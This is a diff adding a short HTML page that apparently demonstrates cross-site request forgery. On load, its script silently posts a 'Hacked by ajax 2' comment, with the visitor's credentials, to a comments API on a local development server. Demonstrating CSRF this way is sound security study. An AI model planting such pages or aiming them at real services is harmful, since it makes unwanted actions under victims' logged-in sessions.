@@ -1,0 +1,22 @@
+<html>
+<head>
+        <script src="/Scripts/jquery-1.10.2.js"></script>
+    <script>
+    $.ajax ( {
+       type:"post",
+       //si es cross domain asume siempre Text. Por eso se envia data como se envia
+       contentType: "application/json",
+       dataType: "json",
+       url: 'http://localhost:49526/Api/Comments',
+       data:"{comment:'Hacked by ajax 2'}",
+        xhrFields: {
+                     withCredentials: true
+                   }
+
+    });
+    </script>
+</head>
+<body>
+    <h2>En background</h2>
+</body>
+</html>
